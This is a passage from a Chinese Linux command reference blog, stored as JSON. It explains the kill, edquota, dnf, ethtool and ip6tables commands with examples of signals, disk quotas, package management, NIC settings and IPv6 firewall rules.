SIGRTMIN+15 50) SIGRTMAX-14 10) SIGRTMAX-13 52) SIGRTMAX-12 53) SIGRTMAX-11 54) SIGRTMAX-10 11) SIGRTMAX-9 56) SIGRTMAX-8 57) SIGRTMAX-7 58) SIGRTMAX-6 12) SIGRTMAX-5 60) SIGRTMAX-4 61) SIGRTMAX-3 62) SIGRTMAX-2 13) SIGRTMAX-1 64) SIGRTMAX # 下面是常用的信号。 # 只有第 9 种信号 (SIGKILL) 才可以无条件终止进程，其他信号进程都有权利忽略。 HUP 1 终端挂断 INT 2 中断（同 Ctrl + C） QUIT 3 退出（同 Ctrl + \\） KILL 9 强制终止 TERM 15 终止 CONT 18 继续（与 STOP 相反，fg/bg 命令） STOP 19 暂停（同 Ctrl + Z） # 以下发送 KILL 信号的形式等价。当然还有更多的等价形式，在此不一一列举了。 [user2@pc] kill -s SIGKILL PID [user2@pc] kill -s KILL PID [user2@pc] kill -n 9 PID [user2@pc] kill -9 PID [user2@pc] sleep 90 &amp; [1] 178420 # 终止作业标识符为 1 的作业。 [user2@pc] kill -9 %1 [user2@pc] jobs -l [1]+ 178420 KILLED ssh 192.168.1.4 [user2@pc] sleep 90 &amp; [1] 181357 # 发送停止信号。 [user2@pc] kill -s STOP 181357 [user2@pc] jobs -l [1]+ 181537 Stopped (signal) sleep 90 # 发送继续信号。 [user2@pc] kill -s CONT 181357 [user2@pc] jobs -l [1]+ 181537 Running sleep 90 &amp; 注意 bash的作业控制命令包括bg fg kill wait disown suspend。 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 外部命令 概要 kill [-signal|-s signal|-p] [-q value] [-a] [--] pid|name... kill -l [number] | -L 主要用途 发送信号到进程（可以为多个）。 列出信号。 选项 -s, --signal signal 要发送的信号，可能是信号名称或信号对应的数字。 -l, --list [number] 打印信号名称或转换给定数字到信号名称。信号名称可参考文件（/usr/include/linux/signal.h）。 -L, --table 和 '-l' 选项类似，但是输出信号名称以及信号对应的数字。 -a, --all 不要限制“命令名到 pid”的转换为具有与当前进程相同的 UID 的进程。 -p, --pid 打印目标进程的 PID 而不发送信号。 --verbose 打印信号以及接收信号的 PID。 -q, --queue value 使用 sigqueue(3) 而不是 kill(2)。参数 value 是信号对应的数字。 如果接收进程已为此信号安装了处理程序将 SA_SIGINFO 标记为 sigaction(2)，则可以获取 该数据通过 siginfo_t 结构的 si_sigval 字段。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 参数 接收信号的进程列表可以是 PID 以及 name 的混合组成。 PID：每一个 PID 可以是以下四种情况之一： 状态 说明 n 当n大于0时，PID为n的进程接收信号。 0 当前进程组中的所有进程均接收信号。 -1 PID大于1的所有进程均接收信号。 -n 当n大于1时，进程组n中的所有进程接收信号。当给出了一个参数的形式为“-n”，想要让它表示一个进程组，那么必须首先指定一个信号，或参数前必须有一个“--”选项，否则它将被视为发送的信号。 name：使用此名称调用的所有进程将接收信号。 例子 &gt; sleep 20 &amp; # 列出对应的 PID。 &gt; kill -p sleep 23021 返回值 0 成功。 1 失败。 64 部分成功（当指定了多个进程时）。 注意 该命令是GNU coreutils包中的命令，相关的帮助信息请查看man -s 1 kill或info coreutils 'kill invocation'。 启动或关闭内建命令请查看enable命令，关于同名优先级的问题请查看builtin命令的例子部分的相关讨论。 与kill命令类似的有xkill，pkill,killall等，用于不同的目的和场景。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"kill","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/kill/","stats":{"text":"6 min read","time":304000,"words":1173,"minutes":6},"date":"2022-02-02 16:14:03","dateFormat":"2022-02-02"},{"content":"用于编辑指定用户或工作组磁盘配额。 补充说明 edquota 命令用于编辑指定用户或工作组磁盘配额。edquota 预设会使用 vi 来编辑使用者或群组的 quota 设置。 语法 edquota (选项) (参数) 选项 -u：设置用户的 quota，这是预设的参数； -g：设置群组的 quota； -p&lt;源用户名称&gt;：将源用户的 quota 设置套用至其他用户或群组； -t：设置宽限期限。 参数 用户：指定要编辑磁盘配额限制的用户名或者工作组。 实例 配置系统的磁盘配额支持 首先，磁盘配额是区域性的，我们可以决定哪块分区进行磁盘配额，哪块分区不用（自然也就不用配置了）。一般而言，作为一台 web 虚拟主机服务器，/home和/www（或者类似的）是供用户存放资源的分区，所以可以对这两个分区进行磁盘配额。假定我们需要对/home分区实现用户级的限制，而对/www进行每个组的用户配额。 第一步： vi /etc/fstab 找到对应于/home和/www的行，例如： /dev/sda5 /home ext2 defaults 1 2 /dev/sda7 /www ext2 defaults 1 2 在/home里实现用户级的磁盘配额，所以对 sda5 行的挂装选项域做如下修改： /dev/sda5 /home ext2 defaults，usrquota 1 2 注意，是 usrquota 哦。类似的，我们可以如下修改/www行： /dev/sda7 /www ext2 defaults，grpquota 1 2 如编辑根用户 改/etc/fstab文件中 LABEL=/ / ext2 defaults,usrquota,grpquota 1 1 说明：/etc/fstab文件的每一行由六个字段组成： 第一个字段：文件系统（分区）的注释（类似卷标）； 第二个字段：文件系统的装载点； 第三个字段：文件系统类型（磁盘配额只能在 ext2 文件系统上实现）； 第四个字段：装载文件系统是使用的选项，如果只想实现基于用户的磁盘配额，就加入 usrquota 关键字，只想实现基于组的磁盘配额，就加入 grpqouta 关键字，如果两者都需要，就全写入，中间可以用逗号分隔。 第五个字段：表明该文件系统（分区）是否为只读，如果是 0 就表示只读，1 表示可以读写。 第六个字段：表示系统启动执行 fsck 时检查的顺序。 注意：请特别注意这里的拼写，是 usrquota 和 grpquota，不要写成 userquota 和 groupquota。 进入单用户模式，用 quotacheck 生成.user 或.group 文件 quotacheck 你的目录 example:quotacheck / ; quotacheck /home 如果单用户模式报错的话 umount 你的设备/dev/hda* 再执行就 ok 了，重启动系统，如果一切正常的话，quota 将开始正常工作。 设置用户和组配额的分配量 对磁盘配额的限制一般是从一个用户占用磁盘大小和所有文件的数量两个方面来进行的。在具体操作之前，我们先了解一下磁盘配额的两个基本概念：软限制和硬限制。 软限制：一个用户在文件系统可拥有的最大磁盘空间和最多文件数量，在某个宽限期内可以暂时超过这个限制。 硬限制：一个用户可拥有的磁盘空间或文件的绝对数量，绝对不允许超过这个限制。 通过 edquota 直接编辑数据文件： 使用编辑配额命令 edquota 为用户配置定额，在重新启动系统之后，我们假设 lanf 是需要定额的系统帐户，可以使用如下命令来为用户分配磁盘配额： edquota -u lanf 这个命令将启动默认文本编辑器（如 vi 或其他由$EDITOR 环境变量指定的编辑器），其内容如下所示： Quotas for user lanf: /dev/sda5:blocks in use:0,limits(soft = 0,hard = 0) inodes in use:0,limits(soft = 0,hard = 0) 这表示 lanf 用户在/dev/sda5分区（该分区已经在 usrquota 的控制之下）中迄今使用了 0 个数据块（以 K 为单位），并且没有设限制（包括软限制 soft 和硬限制 hard），同样，lanf 在这个分区也没有任何文件和目录，并且也没有任何软硬限制。如果，我们想对用户进行磁盘容量的限制的话，只需要修改 blocks 行的 limits 部分就可以了，注意单位使用的是 K。例如要为 lanf 分配 100M 磁盘的软限制，400M 硬限制，可以使用如下的设置： Quotas for user lanf: /dev/sda5:blocks in use:0,limits(soft = 102400,hard = 409800) inodes in use:0,limits(soft = 0,hard = 0) 同样的，要对文件目录的数量限制可以相应的修改 inodes 行。我们也可以同时对这两项都作出限制。只需要如下的修改 Quotas for user lanf： /dev/sda5:blocks in use:0,limits(soft = 102400,hard = 409800) inodes in use:0,limits(soft = 12800,hard = 51200) 这表示除了相应的容量的限制外，还对文件/目录的数量做了 12800 个的软限制和 51200 个的硬限制。在保存了新的配置后，该用户的磁盘使用就不能超过硬限制。如果用户试图超过这个限制，该操作将被取消，然后得到一个错误信息。但是，如果每个用户都要这么麻烦的设置的话，那这种重复的体力劳动实在有点令人不寒而栗，而且也太浪费时间了。幸好 edquota 还有个-p 参数（prototype）可以对已有的用户设置进行拷贝。例如，我们想对 Jack、Tom、Chen 三个用户使用和 lanf 一样的限额配置，可以使用如下的命令： edquota -p lanf -u Jack Tom Chen 这样一来，这三个用户就被赋予了和 lanf 一样的磁盘配额。 对组的配额，除了 edquota 命令中对应-u选项的改为-g选项，例如下面对 webterm1 组的操作： edquota -g webterm1 实际上，以上的限制只是对用户设定的硬限制在起作用。如果需要使软限制也起作用的话，还需要对用户的软限制设定宽限期，缺省的软限制的宽限期是无穷，这可以使用 edquota 命令的-t选项来实现。运行下面的命令： edquota -t edquota 将打开缺省编辑器显示如下内容： time units may be:days,hours,minutes,or seconds Grace period before enforcing soft limits for users: /dev/sda5:block grace period:0 days,file grace period:0 days 可以使用天、小时、分、秒为单位来设定宽限期。例如，在下面这个例子中，磁盘空间限制的宽限期为两天，而文件数量限制的宽限期只有 6 个小时。 Time units may be:days,hours,minutes,or seconds Grace period before enforcing soft limits for users: /dev/sda5:block grace period:2 days,file grace period:6 hours 通过 setquota 工具加入： 比如加入用户 bye2000 的磁盘配额，执行以下命令： setquota –u / 2000 2500 100 110 bye2000 以下是 setquota 命令用法的简单描述： setquota [ -u|-g ] 装载点 软块数 硬块数 软文件数 硬文件数 用户名/组名 查看用户磁盘使用情况 要查明某一个用户使用了多少磁盘空间，例如 lanf，可以使用如下的命令： quota -u lanf 显示： Disk quotas for user lanf(uid 503): Filesystem blocks quota limit grace file quota limit grace /dev/sda5 3 102400 409800 1 12800 51200 同样，可以使用quota -g groupname命令来参看某个组的磁盘使用情况。 注意： 如果该用户没有配置磁盘限额的话，输出显示Disk quotas for user hujm (uid 503): none 如果不带任何参数运行 quota 的话，查看的是你自己的配额使用情况。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"edquota","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/edquota/","stats":{"text":"8 min read","time":446000,"words":1944,"minutes":8},"date":"2022-02-02 16:11:45","dateFormat":"2022-02-02"},{"content":"新一代的 RPM 软件包管理器。 补充说明 DNF 是新一代的 rpm 软件包管理器。他首先出现在 Fedora 18 这个发行版中。而最近，它取代了 yum，正式成为 Fedora 22 的包管理器。 DNF 包管理器克服了 YUM 包管理器的一些瓶颈，提升了包括用户体验，内存占用，依赖分析，运行速度等多方面的内容。DNF 使用 RPM, libsolv 和 hawkey 库进行包管理操作。尽管它没有预装在 CentOS 和 RHEL 7 中，但你可以在使用 YUM 的同时使用 DNF 。 DNF 的最新稳定发行版版本号是 1.0，发行日期是 2015 年 5 月 11 日。 这一版本的额 DNF 包管理器（包括在他之前的所有版本） 都大部分采用 Python 编写，发行许可为 GPL v2. 安装 DNF 包管理器 DNF 并未默认安装在 RHEL 或 CentOS 7 系统中，但是 Fedora 22 已经默认使用 DNF . 1、为了安装 DNF ，您必须先安装并启用 epel-release 依赖。 在系统中执行以下命令： yum install epel-release 或者 yum install epel-release -y 其实这里并没有强制使用”-y”的理由，相反的，在不使用”-y”的情况下，用户可以在安装过程中查看到底有哪些东西被安装进了系统。但对于没有这个需求的用户，您可以在 YUM 中使用”-y”参数来自动安装所有东西。 2、使用 epel-release 依赖中的 YUM 命令来安装 DNF 包。在系统中执行以下命令： yum install dnf 然后， DNF 包管理器就被成功的安装到你的系统中了。接下来，是时候开始我们的教程了！在这个教程中，您将会学到 27 个用于 DNF 包管理器的命令。使用这些命令，你可以方便有效的管理您系统中的 RPM 软件包。现在，让我们开始学习 DNF 包管理器的 27 条常用命令吧！ 查看 DNF 包管理器版本 用处：该命令用于查看安装在您系统中的 DNF 包管理器的版本 dnf –version !Check-DNF-Version 查看系统中可用的 DNF 软件库 用处：该命令用于显示系统中可用的 DNF 软件库 dnf repolist 查看系统中可用和不可用的所有的 DNF 软件库 用处：该命令用于显示系统中可用和不可用的所有的 DNF 软件库 dnf repolist all 列出所有 RPM 包 用处：该命令用于列出用户系统上的所有来自软件库的可用软件包和所有已经安装在系统上的软件包 dnf list 列出所有安装了的 RPM 包 用处：该命令用于列出所有安装了的 RPM 包 dnf list installed 列出所有可供安装的 RPM 包 用处：该命令用于列出来自所有可用软件库的可供安装的软件包 dnf list available 搜索软件库中的 RPM 包 用处：当你不知道你想要安装的软件的准确名称时，你可以用该命令来搜索软件包。你需要在”search”参数后面键入软件的部分名称来搜索。（在本例中我们使用”nano”） dnf search nano 查找某一文件的提供者 用处：当你想要查看是哪个软件包提供了系统中的某一文件时，你可以使用这条命令。（在本例中，我们将查找”/bin/bash”这个文件的提供者） dnf provides /bin/bash 查看软件包详情 用处：当你想在安装某一个软件包之前查看它的详细信息时，这条命令可以帮到你。（在本例中，我们将查看”nano”这一软件包的详细信息） dnf info nano 安装软件包 用处：使用该命令，系统将会自动安装对应的软件及其所需的所有依赖（在本例中，我们将用该命令安装 nano 软件） dnf install nano 升级软件包 用处：该命令用于升级制定软件包（在本例中，我们将用命令升级”systemd”这一软件包） dnf update systemd 检查系统软件包的更新 用处：该命令用于检查系统中所有软件包的更新 dnf check-update 升级所有系统软件包 用处：该命令用于升级系统中所有有可用升级的软件包 dnf update 或 dnf upgrade 删除软件包 用处：删除系统中指定的软件包（在本例中我们将使用命令删除”nano”这一软件包） dnf remove nano 或 dnf erase nano 删除无用孤立的软件包 用处：当没有软件再依赖它们时，某一些用于解决特定软件依赖的软件包将会变得没有存在的意义，该命令就是用来自动移除这些没用的孤立软件包。 dnf autoremove 删除缓存的无用软件包 用处：在使用 DNF 的过程中，会因为各种原因在系统中残留各种过时的文件和未完成的编译工程。我们可以使用该命令来删除这些没用的垃圾文件。 dnf clean all 获取有关某条命令的使用帮助 用处：该命令用于获取有关某条命令的使用帮助（包括可用于该命令的参数和该命令的用途说明）（本例中我们将使用命令获取有关命令”clean”的使用帮助） dnf help clean 查看所有的 DNF 命令及其用途 用处：该命令用于列出所有的 DNF 命令及其用途 dnf help 查看 DNF 命令的执行历史 用处：您可以使用该命令来查看您系统上 DNF 命令的执行历史。通过这个手段您可以知道在自您使用 DNF 开始有什么软件被安装和卸载。 dnf history 查看所有的软件包组 用处：该命令用于列出所有的软件包组 dnf grouplist 安装一个软件包组 用处：该命令用于安装一个软件包组（本例中，我们将用命令安装”Educational Software”这个软件包组） dnf groupinstall ‘Educational Software’ 升级一个软件包组中的软件包 用处：该命令用于升级一个软件包组中的软件包（本例中，我们将用命令升级”Educational Software”这个软件包组中的软件） dnf groupupdate ‘Educational Software’ 删除一个软件包组 用处：该命令用于删除一个软件包组（本例中，我们将用命令删除”Educational Software”这个软件包组） dnf groupremove ‘Educational Software’ 从特定的软件包库安装特定的软件 用处：该命令用于从特定的软件包库安装特定的软件（本例中我们将使用命令从软件包库 epel 中安装 phpmyadmin 软件包） dnf –enablerepo=epel install phpmyadmin 更新软件包到最新的稳定发行版 用处：该命令可以通过所有可用的软件源将已经安装的所有软件包更新到最新的稳定发行版 dnf distro-sync 重新安装特定软件包 用处：该命令用于重新安装特定软件包（本例中，我们将使用命令重新安装”nano”这个软件包） dnf reinstall nano 回滚某个特定软件的版本 用处：该命令用于降低特定软件包的版本（如果可能的话）（本例中，我们将使用命令降低”acpid”这个软件包的版本） dnf downgrade acpid 样例输出： Using metadata from Wed May 20 12:44:59 2015 No match for available package: acpid-2.0.19-5.el7.x86_64 Error: Nothing to do. 原作者注：在执行这条命令的时候， DNF 并没有按照我期望的那样降级指定的软件（“acpid”）。该问题已经上报。 总结 DNF 包管理器作为 YUM 包管理器的升级替代品，它能自动完成更多的操作。但在我看来，正因如此，所以 DNF 包管理器不会太受那些经验老道的 Linux 系统管理者的欢迎。举例如下： 在 DNF 中没有 –skip-broken 命令，并且没有替代命令供选择。 在 DNF 中没有判断哪个包提供了指定依赖的 resolvedep 命令。 在 DNF 中没有用来列出某个软件依赖包的 deplist 命令。 当你在 DNF 中排除了某个软件库，那么该操作将会影响到你之后所有的操作，不像在 YUM 下那样，你的排除操作只会咋升级和安装软件时才起作用。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dnf","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dnf/","stats":{"text":"8 min read","time":471000,"words":2156,"minutes":8},"date":"2022-02-02 16:10:54","dateFormat":"2022-02-02"},{"content":"显示或修改以太网卡的配置信息。 补充说明 ethtool 命令用于获取以太网卡的配置信息，或者修改这些配置。这个命令比较复杂，功能特别多。 语法 ethtool [ -a | -c | -g | -i | -d | -k | -r | -S |] ethX ethtool [-A] ethX [autoneg on|off] [rx on|off] [tx on|off] ethtool [-C] ethX [adaptive-rx on|off] [adaptive-tx on|off] [rx-usecs N] [rx-frames N] [rx-usecs-irq N] [rx-frames-irq N] [tx-usecs N] [tx-frames N] [tx-usecs-irq N] [tx-frames-irq N] [stats-block-usecs N][pkt-rate-low N][rx-usecs-low N] [rx-frames-low N] [tx-usecs-low N] [tx-frames-lowN] [pkt-rate-high N] [rx-usecs-high N] [rx-frames-high N] [tx-usecs-high N] [tx-frames-high N] [sample-interval N] ethtool [-G] ethX [rx N] [rx-mini N] [rx-jumbo N] [tx N] ethtool [-e] ethX [raw on|off] [offset N] [length N] ethtool [-E] ethX [magic N] [offset N] [value N] ethtool [-K] ethX [rx on|off] [tx on|off] [sg on|off] [tso on|off] ethtool [-p] ethX [N] ethtool [-t] ethX [offline|online] ethtool [-s] ethX [speed 10|100|1000] [duplex half|full] [autoneg on|off] [port tp|aui|bnc|mii] [phyad N] [xcvr internal|external] [wol p|u|m|b|a|g|s|d...] [sopass xx:yy:zz:aa:bb:cc] [msglvl N] 选项 -a 查看网卡中 接收模块RX、发送模块TX和Autonegotiate模块的状态：启动on 或 停用off。 -A 修改网卡中 接收模块RX、发送模块TX和Autonegotiate模块的状态：启动on 或 停用off。 -c display the Coalesce information of the specified ethernet card。 -C Change the Coalesce setting of the specified ethernet card。 -g Display the rx/tx ring parameter information of the specified ethernet card。 -G change the rx/tx ring setting of the specified ethernet card。 -i 显示网卡驱动的信息，如驱动的名称、版本等。 -d 显示register dump信息, 部分网卡驱动不支持该选项。 -e 显示EEPROM dump信息，部分网卡驱动不支持该选项。 -E 修改网卡EEPROM byte。 -k 显示网卡Offload参数的状态：on 或 off，包括rx-checksumming、tx-checksumming等。 -K 修改网卡Offload参数的状态。 -p 用于区别不同ethX对应网卡的物理位置，常用的方法是使网卡port上的led不断的闪；N指示了网卡闪的持续时间，以秒为单位。 -r 如果auto-negotiation模块的状态为on，则restarts auto-negotiation。 -S 显示NIC- and driver-specific 的统计参数，如网卡接收/发送的字节数、接收/发送的广播包个数等。 -t 让网卡执行自我检测，有两种模式：offline or online。 -s 修改网卡的部分配置，包括网卡速度、单工/全双工模式、mac地址等。 数据来源 Ethtool 命令显示的信息来源于网卡驱动层，即 TCP/ip 协议的链路层。该命令在 Linux 内核中实现的逻辑层次为： 最重要的结构体struct ethtool_ops，该结构体成员为用于显示或修改以太网卡配置的一系列函数指针，见下表中的第二列。 网卡驱动负责实现（部分）这些函数，并将其封装入ethtool_ops结构体，为网络核心层提供统一的调用接口。因此，不同的网卡驱动会给应用层返回不同的信息。Ethtool 命令选项、struct ethtool_ops 成员函数、Ethtool 命令显示参数的来源，三者间的对应关系如下表所示： 命令选项 struct ethtool_ops成员函数 Ethtool命令显示参数的来源（以网卡驱动BNX2为例） 无 -s get_settingsget_wol get_msglevel get_link set_settings set_wol set_msglevel 从网卡寄存器中获得网卡速度等信息，可配置。 -a -A get_pauseparam set_pauseparam 从网卡寄存器中获得Autonegotiate/RX/TX模块的状态：on oroff，可配置。 -c -C get_coalesceset_coalesce 从网卡寄存器中获得coalescing参数：TX/RX一个数据包后，推迟发生TX/RX中断的时间(us)/数据包个数。—减小该值可以提高网卡的响应时间。 当rx-usecs&amp;rx-frames同时被设为0时，RX中断停止。 当tx-usecs&amp;tx-frames同时被设为0时，TX中断停止。 -g -G get_ringparam set_ringparam 除当前TX/RX ring的值（从网卡寄存器中读取得到，可配置）外，其它为网卡bnx2自己固定的信息。 -k -K get_rx_csumget_tx_csum get_sg get_tso set_rx_csum set_tx_csum set_sg set_tso 显示信息从保存该状态的变量中读取得到，没有对应的寄存器。因此，TX/RX校验等模块一直处于on状态，实际上是无法修改的。 -i get_drvinfo[self_test_count, get_stats_coun,t get_regs_len, get_eeprom_len] 网卡bnx2自己固定的信息，如： ——————————————————– driver: bnx2 version: 1.4.30 firmware-version: 1.8.0.5 bus-info: 0000:09:00.0 ——————————————————– -d get_drvinfoget_regs 不支持，即bnx2中没有实现函数get_regs。 -e -E get_eepromset_eeprom 不支持，即bnx2中没有实现函数get_eeprom。 -r nway_reset 配置网卡MII_BMCR寄存器，重启Auto negotiation模块。 -p phys_id 配置网卡BNX2_EMAC_LED寄存器，实现LED闪功能。 -t self_test 通过配置网卡寄存器，逐一测试网卡的硬件模块：registers，memory，loopback，Link stat，interrupt。 -S get_ethtool_stats 显示信息来源于网卡驱动中的结构体变量stats_blk。（网卡通过DMA方式，将寄存器BNX2_HC_STATISTICS _ADDR_L和BNX2_HC_STATISTICS_ADDR_H中的数据实时地读取到结构体变量struct statistics_block *stats_blk中。） —显示的数据都是从网卡寄存器中统计得到的，各项的含义需查询网卡（芯片）手册。 由上可见，ethtool 命令用于显示/配置网卡硬件（寄存器）。 实例 查看机器上网卡的速度：百兆还是千兆，请输入： ethool eth0 操作完毕后，输出信息中Speed:这一项就指示了网卡的速度。停止网卡的发送模块 TX，请输入： ethtool -A tx off eth0 操作完毕后，可输入ethtool -a eth0，查看 tx 模块是否已被停止。查看网卡 eth0 采用了何种驱动，请输入： ethtool -i eth0 操作完毕后，显示 driver: bnx2； version: 1.4.30 等信息。关闭网卡对收到的数据包的校验功能，请输入： ethtool -K eth0 rx off 操作完毕后，可输入ethtool –k eth0，查看校验功能是否已被停止。如果机器上安装了两块网卡，那么 eth0 对应着哪块网卡呢？输入： ethtool -p eth0 10 操作完毕后，看哪块网卡的 led 灯在闪，eth0 就对应着哪块网卡。查看网卡，在接收/发送数据时，有没有出错？请输入： ethtool –S eth0 将千兆网卡的速度降为百兆，请输入： ethtool -s eth0 speed 100 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ethtool","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ethtool/","stats":{"text":"7 min read","time":394000,"words":1553,"minutes":7},"date":"2022-02-02 16:09:08","dateFormat":"2022-02-02"},{"content":"linux 中防火墙软件。 补充说明 ip6tables 命令和 iptables 一样，都是 linux 中防火墙软件，不同的是 ip6tables 采用的 TCP/ip 协议为 IPv6。 语法 ip6tables (选项) 选项 -t&lt;表&gt;：指定要操纵的表； -A：向规则链中添加条目； -D：从规则链中删除条目； -i：向规则链中插入条目； -R：替换规则链中的条目； -L：显示规则链中已有的条目； -F：清楚规则链中已有的条目； -Z：清空规则链中的数据包计算器和字节计数器； -N：创建新的用户自定义规则链； -P：定义规则链中的默认目标； -h：显示帮助信息； -p：指定要匹配的数据包协议类型； -s：指定要匹配的数据包源 ip 地址； -j&lt;目标&gt;：指定要跳转的目标； -i&lt;网络接口&gt;：指定数据包进入本机的网络接口； -o&lt;网络接口&gt;：指定数据包要离开本机所使用的网络接口。 -c&lt;计数器&gt;：在执行插入操作（insert），追加操作（append），替换操作（replace）时初始化包计数器和字节计数器。 实例 在命令行窗口输入下面的指令就可以查看当前的 IPv6 防火墙配置： ip6tables -nl --line-numbers /etc/sysconfig/ip6tables 文件 使用编辑器编辑/etc/sysconfig/ip6tables文件： vi /etc/sysconfig/ip6tables 可能会看到下面的默认 ip6tables 规则： *filter :INPUT accept [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] :RH-Firewall-1-INPUT - [0:0] -A INPUT -j RH-Firewall-1-INPUT -A FORWARD -j RH-Firewall-1-INPUT -A RH-Firewall-1-INPUT -i lo -j ACCEPT -A RH-Firewall-1-INPUT -p icmpv6 -j ACCEPT -A RH-Firewall-1-INPUT -p 50 -j ACCEPT -A RH-Firewall-1-INPUT -p 51 -j ACCEPT -A RH-Firewall-1-INPUT -p udp --dport 5353 -d ff02::fb -j ACCEPT -A RH-Firewall-1-INPUT -p udp -m udp --dport 631 -j ACCEPT -A RH-Firewall-1-INPUT -p tcp -m tcp --dport 631 -j ACCEPT -A RH-Firewall-1-INPUT -p udp -m udp --dport 32768:61000 -j ACCEPT -A RH-Firewall-1-INPUT -p tcp -m tcp --dport 32768:61000 ! --syn -j ACCEPT -A RH-Firewall-1-INPUT -m tcp -p tcp --dport 22 -j ACCEPT -A RH-Firewall-1-INPUT -j reject --reject-with icmp6-adm-prohibited COMMIT 与 IPv4 的 iptables 规则类似，但又不完全相同。 要开启 80 端口（HTTP 服务器端口），在 COMMIT 一行之前添加如下规则： -A RH-Firewall-1-INPUT -m tcp -p tcp --dport 80 -j ACCEPT -p tcp表示仅针对 tcp 协议的通信。--dport指定端口号。 要开启 53 端口（DNS 服务器端口），在 COMMIT 一行之前添加如下规则： -A RH-Firewall-1-INPUT -m tcp -p tcp --dport 53 -j ACCEPT -A RH-Firewall-1-INPUT -m udp -p tcp --dport 53 -j ACCEPT 同时针对 tcp 和 udp 协议开启 53 端口。 要开启 443 端口，在 COMMIT 一行之前添加如下规则： -A RH-Firewall-1-INPUT -m tcp -p tcp --dport 443 -j ACCEPT 要开启 25 端口（SMTP 邮件服务器端口），在 COMMIT 一行之前添加如下规则： -A RH-Firewall-1-INPUT -m tcp -p tcp --dport 25 -j ACCEPT 对于那些没有特定规则与之匹配的数据包，可能是我们不想要的，多半是有问题的。我们可能也希望在丢弃（DROP）之前记录它们。此时，可以将最后一行： -A RH-Firewall-1-INPUT -j REJECT --reject-with icmp6-adm-prohibited COMMIT 改为： -A RH-Firewall-1-INPUT -j LOG -A RH-Firewall-1-INPUT -j DROP COMMIT 保存并关闭该文件。然后重新启动 ip6tables 防火墙： # service ip6tables restart 然后重新查看 ip6tables 规则，可以看到如下所示的输出： # ip6tables -vnL --line-numbers 输出示例： Chain INPUT (policy ACCEPT 0 packets, 0 bytes) num pkts bytes target prot opt in out source destination 1 42237 3243K RH-Firewall-1-INPUT all * * ::/0 ::/0 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) num pkts bytes target prot opt in out source destination 1 0 0 RH-Firewall-1-INPUT all * * ::/0 ::/0 Chain OUTPUT (policy ACCEPT 12557 packets, 2042K bytes) num pkts bytes target prot opt in out source destination Chain RH-Firewall-1-INPUT (2 references) num pkts bytes target prot opt in out source destination 1 6 656 ACCEPT all lo * ::/0 ::/0 2 37519 2730K ACCEPT icmpv6 * * ::/0 ::/0 3 0 0 ACCEPT esp * * ::/0 ::/0 4 0 0 ACCEPT ah * * ::/0 ::/0 5 413 48385 ACCEPT udp * * ::/0 ff02::fb/128 udp dpt:5353 6 0 0 ACCEPT udp * * ::/0 ::/0 udp dpt:631 7 0 0 ACCEPT tcp * * ::/0 ::/0 tcp dpt:631 8 173 79521 ACCEPT udp * * ::/0 ::/0 udp dpts:32768:61000 9 0 0 ACCEPT tcp * * ::/0 ::/0 tcp dpts:32768:61000 flags:!0x16/0x02 10 0 0 ACCEPT tcp * * ::/0 ::/0 tcp dpt:22 11 0 0 ACCEPT tcp * * ::/0 ::/0 tcp dpt:80 12 0 0 ACCEPT tcp * * ::/0 ::/0 tcp dpt:53 13 4108 380K ACCEPT udp * * ::/0 ::/0 udp dpt:53 14 18 4196 REJECT all * * ::/0 ::/0 IPv6 私有 IP IPv4 通常默认即可保护内部局域网私有 IP 上的主机。但是 IPv6 的地址非常丰富，不再需要使用类似 NAT 等协议的私有网络。这样一来，所有的内部主机都可以拥有公网 IP 而直接连接到互联网，也就同时暴露于互联网上的各种威胁之中了。那么，如何配置 IPv6 防火墙使其默认将除了 ping6 请求之外的所有输入数据包都丢弃呢？可以使用 FC00::/7 前缀来标识本地 IPv6 单播地址。 允许特定的 ICMPv6 通信 使用 IPv6 的时候需要允许比 IPv4 更多类型的 ICMP 通信以保证路由和 IP 地址自动配置等功能正常工作。有时候，如果你的规则设置太过苛刻，可能都无法分配到正确的 IPv6 地址。当然，不使用 DHCP 而是手动配置 IP 地址的除外。 下面是一些比较常见的 ipv6-icmp 配置实例： :ICMPv6 - [0:0] # Approve certain ICMPv6 types and all outgoing ICMPv6 # http://example.com/ -A INPUT -p icmpv6 -j ICMPv6 -A ICMPv6 -p icmpv6 --icmpv6-type echo-request -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type destination-unreachable -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type packet-too-big -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type time-exceeded -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type parameter-problem -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type router-solicitation -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type router-advertisement -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type neighbour-solicitation -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type neighbour-advertisement -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type redirect -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type 141 -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type 142 -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type 148 -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type 149 -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type 130 -s fe80::/10 -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type 131 -s fe80::/10 -j ACCEPT -A ICMPv6 -p icmpv6 --icmpv6-type 132 -s fe80::/10 -j ACCEPT -A ICMPv6 -p 